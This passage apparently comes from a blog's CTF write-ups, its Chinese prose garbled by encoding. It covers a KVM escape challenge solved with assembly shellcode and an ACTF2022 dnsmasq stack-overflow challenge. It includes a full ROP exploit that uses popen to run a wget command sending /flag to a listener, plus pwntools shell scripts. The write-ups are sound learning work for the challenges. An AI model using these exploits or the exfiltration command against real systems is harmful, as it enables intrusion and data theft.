(bits 0-15)\n    db 0x0 ; Base (bits 16-23)\n    db 10010010b ; Access Byte\n    db 11001111b ; Flags , Limit (bits 16-19)\n    db 0x0 ; Base (bits 24-31)\ngdt_stack:\n    dw 0x7c00 ; Limit (bits 0-15)\n    dw 0x0 ; Base (bits 0-15)\n    db 0x0 ; Base (bits 16-23)\n    db 10010010b ; Access Byte\n    db 01000000b ; Flags , Limit (bits 16-19)\n    db 0x0 ; Base (bits 24-31)\ngdt_end:\n \ngdt_descriptor:\ndw gdt_end - gdt_start - 1 \ndd gdt_start\n```\n### å°è¯•å†™å†™\n\nä»¥æœ¬é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬å°è¯•å†™å †ç©ºé—´ï¼ˆè¶…è¿‡1Mè®¿å­˜ï¼‰ï¼Œå¦‚ä¸‹æ˜¯åŠŸèƒ½ä»£ç ï¼š\n\n```assembly\n\tmov eax, [0x7100] \n    sub eax, 0x603000\n\tmov dword [eax], 0x52525252\n```\n\nç¼–è¯‘å‘½ä»¤ï¼š\n\n```bash\nnasm test.asm -o test.bin\n```\n\nè„šæœ¬ä¸­åŠ è½½è¯»å–test.binçš„æ±‡ç¼–å†…å®¹\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nio = remote(\"127.0.0.1\",8000)\n\nwith open(\"./test.bin\", \"rb\") as f:\n    shellcode = f.read()\n\nraw_input()     # for debug\n\nio.sendlineafter(\"your code size: \",str(len(shellcode)))\nio.sendafter(\"your code: \",shellcode)\nio.sendlineafter(\"guest name: \",\"a\"*0x4)\nio.sendlineafter(\"guest passwd: \",\"b\"*0x4)\nio.sendlineafter(\"host name: \",\"c\"*0x4)\n\nio.interactive()\n```\n\nç»“æœå¦‚ä¸‹ï¼Œå¯¹åº”çš„å †åœ°å€å¤„è¢«å†™ä¸º`52 52 52 52`ï¼Œä¸”`hex(0x1c05010-0x603000) = 0x1602010`è·ç¦»è¶…è¿‡1Mã€‚è¯´æ˜æ­¤æ—¶åœ¨32ä½ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬èƒ½ç›´æ¥è®¿å­˜çš„ç©ºé—´æ›´å¤§äº†ã€‚\n\n```\ngefâ¤  heap chunks\nChunk(addr=0x1c05010, size=0x30, flags=PREV_INUSE)\n    [0x0000000001c05010     52 52 52 52 00 00 00 00 00 00 00 00 00 00 00 00    RRRR............]\nChunk(addr=0x1c05040, size=0x20, flags=PREV_INUSE)\n    [0x0000000001c05040     67 75 65 73 74 20 70 61 73 73 77 64 3a 20 00 00    guest passwd: ..]\n```\n\n\n### ä¿æŠ¤æ¨¡å¼ä¸‹çš„åˆ©ç”¨\n\nè¿›å…¥ä¿æŠ¤æ¨¡å¼åï¼Œç”±äºè®¿å­˜èƒ½åŠ›æ›´å¼ºï¼Œæˆ‘ä»¬å¯ä»¥çœç•¥æš´ç ´çš„ç¯èŠ‚ï¼ŒåŒæ—¶ä¸ç”¨æ ˆä¸­çš„libcåœ°å€äº†ï¼Œè€Œæ˜¯ç›´æ¥å–å †ç©ºé—´ä¸­å­˜åœ¨çš„libcåœ°å€\n\n```\n; ......\n%rep 50\ndb 0x00\n%endrep\n\n[bits 32]\nPModeMain:\n; ......\n\n    mov ebx, [0x7100]\n    add ebx, 0x1b48\n    sub ebx, 0x603000\n    mov edx, [ebx]\t\t\n    sub edx, 0x3c51a8\t\n    add edx, 0x4527a\t; gadget addr\n        \n    push edx\n        \n    mov ebx, [0x7100]\n    add ebx, 0x27e0\t\t; target &nbytes addr\n    add ebx, 0x8\n    sub ebx, 0x603000\t; memcpy arg1 -> &nbytes\n\n    pop edx\n    mov [ebx], edx      ; gadget to &nbytes\n\n    mov ecx, 0x602020\n    mov [0x7100],ecx        ; memcpy arg0 -> 0x602020\n```\n\nå°†ä»¥ä¸Šæ±‡ç¼–åˆå…¥æ¡†æ¶ä¸­ï¼Œç¼–è¯‘æˆtest.binï¼Œæ”»å‡»è„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# io = remote(\"20.247.110.192\",10888)\nio = remote(\"127.0.0.1\",8000)\n\nwith open(\"./test.bin\", \"rb\") as f:\n    shellcode = f.read()\n\nraw_input()     ; for debug\n\nio.sendlineafter(\"your code size: \",str(len(shellcode)))\nio.sendafter(\"your code: \",shellcode)\nio.sendlineafter(\"guest name: \",\"a\"*0x4)\nio.sendlineafter(\"guest passwd: \",\"b\"*0x4)\nio.sendlineafter(\"host name: \",\"c\"*0x4)\n\nio.interactive()\n```\n\nå¯æˆåŠŸè·å–shellã€‚\n\næ±‡ç¼–é‚£ä¸€æ®µï¼Œå¯ä»¥æ›´ç®€åŒ–ï¼ŒCSå’ŒDSæ®µæ˜¯å¿…é¡»çš„ï¼Œå…¶ä»–æ®µå¯ä»¥åˆ é™¤ã€‚è§[test.asm](test.asm)ã€‚\n\n## kvmè·Ÿhostçš„äº¤äº’\n\n> in/outæŒ‡ä»¤ï¼Œå®˜æ–¹WPä¸­åˆ©ç”¨è¿™ä¸ªæŒ‡ä»¤æ³„éœ²libcåœ°å€ï¼Œæˆ‘çš„æ–¹æ³•ä¸­æœªä½¿ç”¨\n\n[æ±‡ç¼–è¯­è¨€ä¸­OUTå’ŒINçš„ç”¨æ³•](https://blog.csdn.net/qq_22642239/article/details/70140859)\n\n[ã€asmåŸºç¡€ã€‘æ±‡ç¼–æŒ‡ä»¤ä¹‹in/outæŒ‡ä»¤](https://blog.csdn.net/jiangwei0512/article/details/50611778)\n\n[ã€KVMã€‘KVMå­¦ä¹ â€”å®ç°è‡ªå·±çš„å†…æ ¸](https://www.jianshu.com/p/5ec4507e9be0)\n\næœ¬é¢˜ä¸­ï¼Œåˆ©ç”¨`out`æŒ‡ä»¤è¿”å›ä¸€ä¸ªå­—ç¬¦`\"W\"`ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nio = remote(\"127.0.0.1\",8000)\n\nshellcode = asm('''\n    .code16\n    mov al, 0x57\n    mov dx, 0x217\n    out dx, al\n    mov al, 10\n    out dx, al\n    hlt\n''')\nprint(type(out1))   # str\nprint(out1)\nprint(repr(out1))   # \"\\xB0\\x57\\xBA\\x17\\x02\\xEE\\xB0\\n\\xEE\\xF4\"\n# repr()æ–¹æ³•å¯ä»¥å°†è¯»å–åˆ°çš„æ ¼å¼å­—ç¬¦ï¼Œæ¯”å¦‚æ¢è¡Œç¬¦ã€åˆ¶è¡¨ç¬¦ï¼Œè½¬åŒ–ä¸ºå…¶ç›¸åº”çš„è½¬ä¹‰å­—ç¬¦\n\nio.sendlineafter(\"your code size: \",str(len(shellcode)))\nio.sendafter(\"your code: \",shellcode)\nio.sendlineafter(\"guest name: \",\"a\"*0x4)\nio.sendlineafter(\"guest passwd: \",\"b\"*0x4)\nio.sendlineafter(\"host name: \",\"c\"*0x4)\n\nio.interactive()\n```\n\ndebugä¿¡æ¯è¯æ˜åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹æˆåŠŸæ‰§è¡Œäº†shellcode\n\n```\n[DEBUG] Received 0x1e bytes:\n    'bbb\\n'\n    'W\\n'\n    'KVM_EXIT_HLT\\n'\n    'host name: '\n```\n\n# ç»­ï¼šä»€ä¹ˆæ˜¯å®æ¨¡å¼å’Œä¿æŠ¤æ¨¡å¼\n\nx86ä¸‹ï¼Œç³»ç»Ÿä¸Šç”µç»è¿‡biosè‡ªæ£€åè¿›å…¥å®æ¨¡å¼ã€‚\n\n>  å®æ¨¡å¼ä¸‹é‡‡ç”¨æ®µå¯»å€æ–¹å¼ï¼Œå¯ç›´æ¥è®¿é—®ç‰©ç†åœ°å€ã€‚æ­¤æ—¶çš„é€šç”¨å¯„å­˜å™¨ä½å®½åªæœ‰16bitï¼Œå€ŸåŠ©æ®µå¯„å­˜å™¨ï¼ˆcsï¼Œdsï¼Œssï¼Œesï¼‰å¯å°†å¯»å€èƒ½åŠ›æ‰©å±•è‡³1MèŒƒå›´ã€‚ï¼ˆlinear address = segment << 4 + offsetï¼‰\n\n[å®æ¨¡å¼ã€ä¿æŠ¤æ¨¡å¼ã€ä¸‰ç§åœ°å€ã€åˆ†æ®µã€åˆ†é¡µ](https://www.cnblogs.com/kelamoyujuzhen/p/10555924.html)\n\nå®æ¨¡å¼æ˜¾ç„¶æ— æ³•æ»¡è¶³è®¡ç®—æœºæ—¥æ¸å¢é•¿çš„è®¿å­˜éœ€æ±‚ï¼Œäºæ˜¯å‡ºç°äº†ä¿æŠ¤æ¨¡å¼ã€‚ä¸ä»…æ‰©å±•äº†è®¿å­˜èƒ½åŠ›ï¼ŒåŒæ—¶ä¹Ÿæé«˜äº†å®‰å…¨æ€§ã€‚\n\nä¿æŠ¤æ¨¡å¼ä¸­å¼•å…¥åˆ†æ®µå’Œåˆ†é¡µçš„æ¦‚å¿µã€‚\n\né€»è¾‘åœ°å€ --[åˆ†æ®µ]--ã€‹ çº¿æ€§åœ°å€ --[åˆ†é¡µ]--ã€‹ ç‰©ç†åœ°å€\n\n- åˆ†æ®µ\n\n[x86æ®µå¯„å­˜å™¨å’Œåˆ†æ®µæœºåˆ¶](https://zhuanlan.zhihu.com/p/324210723)\n\nç”»äº†ä¸€å¼ è¡¨ï¼Œç†æ¸…äº†æ®µé€‰æ‹©å­ï¼ŒGDTRï¼ŒGDTä¹‹é—´çš„å…³ç³»\n\n![image-20220706165811870](image-20220706165811870.png?size=600)\n\n- åˆ†é¡µ\n\n[x86çš„åˆ†é¡µæœºåˆ¶å’ŒLinuxå®ç°](https://zhuanlan.zhihu.com/p/327860921)\n\nCR0å¯„å­˜å™¨çš„PGæ ‡è¯†ç­‰äº1æ—¶ï¼Œè¡¨ç¤ºå¯ç”¨åˆ†é¡µæœºåˆ¶\n\nCR3 é¡µç›®å½•åŸºåœ°å€å¯„å­˜å™¨PDBRï¼ˆPage-Directory Base address Registerï¼‰\n\n\n# å‚è€ƒ\n\n[.rept count](http://web.mit.edu/rhel-doc/3/rhel-as-en-3/rept.html)\n\n[x86 registers](https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html)\n\n[kvm (vm escape, kvm, long mode)](https://github.com/kscieslinski/CTF/tree/master/pwn/conf2020/kvm)\n\n\n\n\n\n\n\n","tags":["kvm"],"categories":["CTF"]},{"title":"ACTF2022 pwn master_of_dnsé¢˜è§£","url":"/2022/07/01/ACTF2022-pwn-master-of-dns/","content":"\n\n\n- é¢˜ç›®æè¿°ï¼šI heard that you are proficient in the DNS protocol, there is just a chance to verify your ability, come and join to solve it.\n\n- é¢˜ç›®é™„ä»¶ï¼š[Maser_of_DNS.zip](Maser_of_DNS.zip)\n\n- æç¤ºï¼šé¢˜ç›®å‚è€ƒä»£ç : https://thekelleys.org.uk/dnsmasq/doc.html\n\n\n\nè¿™ä¸ªé¢˜æ¶‰åŠçš„çŸ¥è¯†ç‚¹è¾ƒå¤šï¼ˆå¯¹æˆ‘æ¥è¯´ï¼‰ï¼Œæœ‰æ²¡è§è¿‡çš„åˆ©ç”¨æ–¹æ³•/æ€è·¯ï¼Œæœ‰è§è¿‡ä½†è¿˜ä¸å¤Ÿç†Ÿæ‚‰çš„ç‚¹ã€‚æ‰€ä»¥è¿˜èŠ±äº†è›®å¤šæ—¶é—´æ…¢æ…¢è°ƒè¯•çš„ã€‚\n\n\n\n# æ€»ç»“\n\n- ä¸€ä¸ªdnsæœåŠ¡å™¨ï¼Œé€šè¿‡digå‘é€ä¸€æ¡dnsè¯·æ±‚æŠ¥æ–‡è¿›è¡Œé€šä¿¡\n- åˆ†ædnsï¼Œæ ¹æ®æç¤ºï¼Œæ˜¯dnsmasqã€‚ä¸‹è½½å¯¹åº”ç‰ˆæœ¬æºç ï¼Œå¹¶ä¿®æ”¹ç¼–è¯‘é€‰é¡¹ï¼Œç¼–è¯‘åä½¿ç”¨bindifè¿›è¡Œæ¯”è¾ƒ\n- æ¯”è¾ƒæ‰¾åˆ°å¯ç–‘æ¼æ´ç‚¹memcpy\n- ä½¿ç”¨gdbä¸‹æ–­ç‚¹è°ƒè¯•memcpyå¤„\n- ä½¿ç”¨wiresharkæŠ“digä¸dnsçš„é€šä¿¡æŠ¥æ–‡ï¼Œå¹¶ç”¨scapyé‡æ”¾\n- æ‰¾åˆ°å…³é”®å­—æ®µï¼Œæ›´æ”¹åç»™dnså‘é€æ¶æ„æŠ¥æ–‡\n- è¶…é•¿æŠ¥æ–‡è¦†ç›–è¿”å›åœ°å€ï¼Œdnsç¨‹åºå´©æºƒã€‚äºæ˜¯å¾—åˆ°äº†ä»»æ„ä»£ç æ‰§è¡Œæƒé™\n- æ— æ³•æ³„éœ²ä¿¡æ¯ï¼Œè€ƒè™‘ROPåˆ©ç”¨\n\n\n\n# åˆ†æ\n\n## è¿è¡Œ\n\né¢˜ç›®é™„ä»¶è¿è¡Œæƒ…å†µå¦‚ä¸‹ï¼Œdnsæ˜¯ä¸€ä¸ªdnsè§£æå™¨ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶å‘é€ç»™å®ƒçš„è¯·æ±‚æŠ¥æ–‡å†…å®¹ã€‚\n\n![](image-20220701152020637.png)\n\n## æ§åˆ¶è¾“å…¥\n\ndigç¨‹åºå°†æŠ¥æ–‡å‘é€çš„ç»†èŠ‚ç»™å°è£…äº†èµ·æ¥ï¼Œè€Œæˆ‘ä»¬éœ€è¦æ§åˆ¶å‘é€æŠ¥æ–‡çš„æ¯ä¸€ä¸ªå­—èŠ‚ã€‚\n\nå› æ­¤ï¼Œä½¿ç”¨wiresharkæŠ“åŒ…ã€‚ç„¶åï¼Œæ›´æ”¹æŠ¥æ–‡å†…å®¹ï¼Œé‡æ–°å‘é€ã€‚\n\nè¯¦æƒ…è§ã€wireshark+scapyå¤„ç†ç½‘ç»œæ•°æ®åŒ…ã€‘ç« èŠ‚ã€‚\n\n## å¯»æ‰¾æ¼æ´\n\næ‰¾æ¼æ´æœ‰ä¸¤ç§æ–¹æ³•ï¼š\n\n1. ç±»fuzzæ³•ï¼šéšæœºæ”¹å˜å‘é€æŠ¥æ–‡çš„å†…å®¹ï¼Œæµ‹è¯•èƒ½å¦è®©dnsæœåŠ¡å´©æºƒï¼ˆçœ‹è¿æ°”ï¼‰\n2. ä»£ç æ£€è§†ï¼šä¸€ç‚¹ç‚¹é€†å‘å®ƒçš„é€»è¾‘é€Ÿåº¦å¤ªæ…¢ï¼Œç¡®è®¤å®ƒæ˜¯dnsmasq 2.86åï¼Œå¯ä»¥ä½¿ç”¨bindiffæ¯”å¯¹\n\nè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•ã€‚\n\nä¸‹è½½dnsmasq 2.86è½¯ä»¶åŒ…å¹¶ç¼–è¯‘ï¼š\n\n```bash\nwget https://thekelleys.org.uk/dnsmasq/dnsmasq-2.86.tar.gz\ntar -zxvf dnsmasq-2.86.tar.gz\ncd dnsmasq-2.86\n# æ›´æ”¹Makefile\n# CFLAGS        = -m32 -fno-stack-protector\n# LDFLAGS       = -m32 -no-pie\nmake\n# åœ¨./src/ç›®å½•ä¸‹è·å¾—dnsmasq\n```\n\nç¼–è¯‘å®Œæˆåï¼Œä½¿ç”¨**å‡½æ•°çº§diffå·¥å…·** [bindiff](https://www.zynamics.com/software.html) å¯¹æ¯”æŸ¥çœ‹äºŒè¿›åˆ¶çš„å·®å¼‚ç‚¹ã€‚\n\n![](image-20220701154221873.png?size=600)\n\nå‘ç°ä¸€ä¸ªå¤§å¤§çš„memcpyï¼Œäºæ˜¯é€šè¿‡ `gdb -p <dns-pid>` attachåˆ°dnsè¿›ç¨‹ï¼Œåœ¨ `b *0804F444` å¤„ä¸‹æ–­ç‚¹ï¼Œè§‚å¯Ÿå‘é€çš„æ•°æ®ä¸­å“ªä¸ªéƒ¨åˆ†ä¼šé€åˆ°è¿™å—è¿›è¡Œå¤„ç†ã€‚\n\n## åˆæ­¥è°ƒè¯•\n\nå°†æ–­ç‚¹æ‰“åœ¨memcpyå¤„è¿›è¡Œè°ƒè¯•\n\n```bash\n# ç¬¬ä¸€ä¸ªçª—å£\n./dns -C ./dns.conf\nps -ef | grep dns\nsudo gdb -p <dns pid>\n> b *0x0804F444\n> c\n# ç¬¬äºŒä¸ªçª—å£\ndig @127.0.0.1 -p 9999 baidu.com\n```\n\næ–­ç‚¹æƒ…å†µå¦‚ä¸‹\n\n![](image-20220628002022674.png?size=600)\n\næ‹·è´å®Œæˆåçš„æ ˆç©ºé—´ï¼š\n\n![](image-20220628002142647.png?size=600)\n\næ ¹æ®è¯¥æ¼æ´å‡½æ•°ä¸­destçš„ä½ç½®ï¼Œå®šä½ebpå’Œè¿”å›åœ°å€çš„å†…å­˜ä½ç½®\n\n```c\nint __cdecl sub_804F345(int a1, int a2, int a3, void *src, int a5, int a6)\n{\n  char *v7; // eax\n  char *v8; // eax\n  char *v9; // eax\n  unsigned __int8 *v10; // eax\n  unsigned __int8 *v11; // eax\n  unsigned __int8 *v12; // eax\n  char dest[848]; // [esp+7h] [ebp-381h] BYREF\n```\n\nè®¡ç®—å¾—åˆ°ebpå­˜æ”¾åœ°å€ï¼š`0xffa650b7 + 0x381 = 0xffa65438`\n\næŸ¥çœ‹è¯¥æ ˆåœ°å€é™„è¿‘å†…å­˜æƒ…å†µï¼Œæ‰¾åˆ°è¿”å›åœ°å€å­˜æ”¾åœ¨`0xffa6543c`å¤„ï¼Œè®¡ç®—åç§»ï¼š`0xffa6543c - 0xffa650b7 = 0x385  `\n\n![image-20220628002718182](image-20220628002718182.png?size=600)\n\n## æ’°å†™è„šæœ¬\n\né€šè¿‡pythonè„šæœ¬å‘é€æ¶æ„æ„é€ çš„æŠ¥æ–‡ï¼Œä½¿è¾“å…¥æ•°æ®è¦†ç›– `sub_804F345` çš„è¿”å›åœ°å€ã€‚ï¼ˆæœ¬é¢˜æ²¡å¼€canaryï¼‰\n\néœ€è¦æ³¨æ„å‡ ç‚¹ï¼š\n\n1. åŸŸåä¸­ä¸€å®šåŒ…å«\".\"ï¼Œç‚¹å’Œç‚¹ä¹‹é—´æœ€å¤šå­˜æ”¾0x3få­—èŠ‚çš„æ•°æ®\n2. \".\"åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œè¢«æ›¿æ¢æˆäº†åä¸€ä¸²å­—ç¬¦çš„å®é™…é•¿åº¦ï¼ˆwiresharkæŠ“åŒ…å‘ç°ï¼‰\n3. dnsæŠ¥æ–‡ä¸­Rawæ•°æ®çš„æ€»é•¿åº¦ï¼Œä¸èƒ½è¶…è¿‡0x400ï¼ˆ`sub_804F345`å‡½æ•°ä¸­æœ‰æ£€æŸ¥ï¼‰\n\n#### ä½¿ç”¨scapyå‘é€\n\nè¿™ä¸ªè„šæœ¬å¯ä»¥å°†è¿”å›åœ°å€è¦†ç›–æˆg.ab\n\n```python\nfrom pwn import *\nfrom scapy.all import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\nio = remote(\"127.0.0.1\",9999,typ=\"udp\")\n\npacket = rdpcap(\"./dns_catch.pcapng\")\nbyte_data = packet[2][Raw].load\ndns_data = DNS(byte_data)\n\npatch = b\"ls > /tmp/x #\".ljust(0x3f,b\";\")+b\".\"\nshellcode1 = patch*13+b'ls > /tmp/x #iiiiiiiiiiiiiiii'+'erty'+b'ooooooooooooooooooooooo.bnmk'+';;.b'+b\"cde.\"\n# erty -> eax\n# ;;.b -> ebx\n# cde. -> ebp\n\nshellcode2 = p32(0x11111111)\n# åŠ«æŒeipä¸º0x11111111\nname_seg = shellcode1 + shellcode2\ndns_data.qd = DNSQR(qname=name_seg,qtype=1,qclass=1)\nbyte_send = raw(dns_data)\nio.sendline(byte_send)\nio.interactive()\n```\n\n\n\n#### ä½¿ç”¨pwntoolsæ„é€ è£¸åŒ…\n\n[DNSåŸŸåé•¿åº¦é™åˆ¶è¯´æ˜ä»¥åŠå®éªŒå®¤å®æˆ˜](https://blog.csdn.net/zhangmingcai/article/details/116719599)\n\n[Common DNS return codes for any DNS service](https://support.umbrella.com/hc/en-us/articles/232254248-Common-DNS-return-codes-for-any-DNS-service-and-Umbrella-)\n\n[Wiresharkåˆ†æDNSåè®®](https://blog.csdn.net/buside/article/details/97139367)\n\n[DNS QUERY MESSAGE FORMAT](https://www.firewall.cx/networking-topics/protocols/domain-name-system-dns/160-protocols-dns-query.html)\n\n[DNSåŸç†åŠå…¶è§£æè¿‡ç¨‹](https://www.zhihu.com/question/23042131)\n\nç»è¿‡æµ‹è¯•ï¼Œdnsè¯·æ±‚æŠ¥æ–‡ä¸­ï¼ŒåŸŸåå­—æ®µï¼Œé€šè¿‡`\".\"`åˆ†éš”å¼€ï¼Œç‚¹ä¸ç‚¹ä¹‹é—´çš„å­—ç¬¦ä¸ªæ•°å¿…é¡»`<=0x3f`\n\n```python\nfrom pwn import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\nio = remote(\"127.0.0.1\",9999,typ=\"udp\")\n\n# a = b\"\\x24\\xb4\\x01\\x20\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x05\\x62\\x61\\x69\\x64\\x75\\x03\\x63\\x6f\\x6d\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x29\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0a\\x00\\x08\\xbe\\x1c\\x51\\x4d\\x75\\xab\\x0c\\x7f\"\n\n# patch = b\"\\x3f\"+b\"ls > /tmp/x#\".ljust(0x3f,b\";\")\npatch = b\"\\x3f\"+b\"a\"*0x3f\n\na_1 = b\"\\x24\\xb4\\x01\\x20\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\"\na_2 = patch*14+b\"\\x04\"+b\"bcde\"\na_3 = b\"\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x29\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0a\\x00\\x08\\xbe\\x1c\\x51\\x4d\\x75\\xab\\x0c\\x7f\"\n\nshellcode = b\"\\x04\"+b\"ghij\"\n# åŠ«æŒeipä¸º\"ghij\"\na = a_1 + a_2 + shellcode + a_3\nio.sendline(a)\nio.interactive()\n```\n\n\n\n# æ§åˆ¶æµåŠ«æŒåçš„åˆ©ç”¨\n\n\n\n## æ–¹æ³•1ï¼šå¾€/tmpç›®å½•æ³¨å…¥è„šæœ¬\n\n> ä¸ç›´æ¥å°†wgetå­—ç¬¦ä¸²å†™åœ¨bssæ®µç»™popenè°ƒç”¨çš„åŸå› ï¼šåˆ©ç”¨`0x0804b2bb`è¿™æ¡gadgetå†™å…¥æ—¶ï¼Œä¸€æ¬¡æ”»å‡»æœ€å¤šåªèƒ½å†™20å­—èŠ‚ï¼Œæ— æ³•å†™å®Œwgetè¯·æ±‚çš„å®Œæ•´å­—ç¬¦ä¸²ã€‚\n\næœ‰ç”¨gadgetï¼Œå¯ä»¥å¾€ä»»æ„åœ°å€å†™å€¼ï¼š\n\n```asm\n0x0804b2bb : mov dword ptr [eax], edx ; ret\n```\n\nå¾€bssæ®µå†™å…¥å†…å®¹ï¼š\n\n1. å°†bssæ®µåœ°å€popç»™eax\n2. å°†å¾…å†™å…¥å†…å®¹ï¼ˆ4bytesï¼‰popç»™edx\n\næœ€åè°ƒpopenæ‰§è¡Œå†™å…¥çš„å†…å®¹ï¼š\n\n1. æ–¹æ³•1ï¼Œå°†å‚æ•°å†™æ­»åœ¨æ ˆä¸Šï¼ˆbssæ®µåœ°å€å’Œå­—ç¬¦ä¸²\"r\"çš„åœ°å€å·²çŸ¥ï¼‰\n\n2. æ–¹æ³•2ï¼Œå°†å‚æ•°åˆ†åˆ«popç»™eaxå’Œedxï¼Œç„¶åè·³è½¬åˆ°å¦‚ä¸‹gadget\n\n   ```asm\n   0x08071802 : push    edx             ; modes\n   0x08071803 : push    eax             ; command\n   0x08071804 : call    _popen\n   ```\n\n\n\n\n\nå®Œæ•´EXPå¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\nfrom scapy.all import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\npacket = rdpcap(\"./dns_catch.pcapng\")\nbyte_data = packet[2][Raw].load\n\npop_eax_ret = 0x08059d44\npop_edx_ret = 0x0807ec72\nmov_eax_edx_ret = 0x0804b2bb\nbss_data_addr = 0x80a72d0 # 0x80a7160\nnop_2e_ret = 0x0804a92e\nstr_r_addr = 0x809c7b2\npopen_plt_addr = 0x0804AB40\nexit_addr = 0x0804AD30\n\n# è¿”å›shellcodeï¼šå¾€ä»»æ„ä¸€ä¸ªåœ°å€å†™20ä¸ªå­—èŠ‚çš„å†…å®¹\ndef arw4(addr,value):\n\tshellcode = p32(pop_eax_ret) + p32(addr) + p32(pop_edx_ret) + value + p32(mov_eax_edx_ret)\n\treturn shellcode\n\n# è¿”å›shellcodeï¼šè°ƒç”¨popenå‡½æ•°ï¼Œéœ€æŒ‡å®šä¸¤ä¸ªå‚æ•°åœ°å€\ndef call_popen(commands,modes):\n\tshellcode = p32(popen_plt_addr) + p32(exit_addr) + p32(commands) + p32(modes)\n\treturn shellcode\n\n# æ‰“åŒ…shellcodeï¼šå‘é€20å­—èŠ‚ï¼ˆ5*4byteï¼‰çš„å†…å®¹\ndef pack_payload5(mycmd):\n    payload = arw4(bss_data_addr,mycmd[0:4])\n    payload += arw4(bss_data_addr+4,mycmd[4:8])\n    payload += arw4(bss_data_addr+8,mycmd[8:12])\n    payload += p32(nop_2e_ret)\n    payload += arw4(bss_data_addr+12,mycmd[12:16])\n    payload += arw4(bss_data_addr+16,mycmd[16:20])\n    payload += call_popen(bss_data_addr,str_r_addr)\n    return payload\n# æ‰“åŒ…shellcodeï¼šå‘é€16å­—èŠ‚ï¼ˆ4*4byteï¼‰çš„å†…å®¹\ndef pack_payload4(mycmd):\n    payload = arw4(bss_data_addr,mycmd[0:4])\n    payload += arw4(bss_data_addr+4,mycmd[4:8])\n    payload += arw4(bss_data_addr+8,mycmd[8:12])\n    payload += p32(nop_2e_ret)\n    payload += arw4(bss_data_addr+12,mycmd[12:16])\n    payload += call_popen(bss_data_addr,str_r_addr)\n    return payload\n# æ‰“åŒ…shellcodeï¼šå‘é€8å­—èŠ‚ï¼ˆ2*4byteï¼‰çš„å†…å®¹\ndef pack_payload2(mycmd):\n    payload = arw4(bss_data_addr,mycmd[0:4])\n    payload += arw4(bss_data_addr+4,mycmd[4:8])\n    payload += p32(nop_2e_ret)\n    payload += call_popen(bss_data_addr,str_r_addr)\n    return payload\n\n# è¿æ¥è¿œç¨‹æœåŠ¡å™¨å¹¶å‘é€dnsè¯·æ±‚æŠ¥æ–‡\ndef send_pack(payload):\n    io = remote(\"59.63.224.108\",9999,typ=\"udp\")\n    # io = remote(\"127.0.0.1\",9999,typ=\"udp\")\n    dns_data = DNS(byte_data)\n    name_seg = b'a'*0x385 + payload\n    dns_data.qd = DNSQR(qname=name_seg,qtype=1,qclass=1)\t# å°†æ–°çš„dataæ‰è¿›dnsæŠ¥æ–‡ä¸­\n    byte_send = raw(dns_data)\n    io.sendline(byte_send)\n    io.close()\n    sleep(18)\n\n# test_str = b\"wget http://127.0.0.1:6789/ \\`cat /flag \\`\"\ntest_str = b\"wget  http://127.0.0.1:6789/$(cat /flag)\"\t\t# å°†è¦å†™å…¥è„šæœ¬ä¸­çš„å­—ç¬¦ä¸²ï¼Œå°†127.0.0.1æ”¹æˆæ¥æ”¶flagçš„æœåŠ¡å™¨ipï¼Œç›‘å¬6789ç«¯å£ï¼ˆnc -l 6789ï¼‰\ni = 0\nwhile i<(len(test_str)-1):\n    target = test_str[i:i+2]\n    mycmd1 = b'echo -n \"'+target+b'\">>/tmp/y'\t\t# é€šè¿‡popenæ‰§è¡Œechoå‘½ä»¤ï¼Œä¸€æ¬¡åªèƒ½å‘é€2ä¸ªæœ‰æ•ˆå­—èŠ‚ï¼ˆå“­\n    payload1 = pack_payload5(mycmd1)\n    send_pack(payload1)\n    i+=2\n\nch_exec_cmd = b\"chmod u+x /tmp/y\"\t\t\t# è„šæœ¬å†…å®¹å‘é€å®Œæ¯•åï¼Œç»™è„šæœ¬æ–‡ä»¶å¢åŠ æ‰§è¡Œæƒé™\npayload2 = pack_payload4(ch_exec_cmd)\nsend_pack(payload2)\n\nexec_cmd = b\"/tmp/y  \"\t\t\t\t\t# ç­‰è„šæœ¬æˆåŠŸæ‰§è¡Œï¼Œå°±èƒ½åœ¨æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ä¸Šçœ‹åˆ°flagå•¦~\npayload3 = pack_payload2(exec_cmd)\nsend_pack(payload3)\n```\n\næ‹¿åˆ°flag\n\n![image-20220630175529627](image-20220630175529627.png?size=600)\n\n\n\n\n\n## 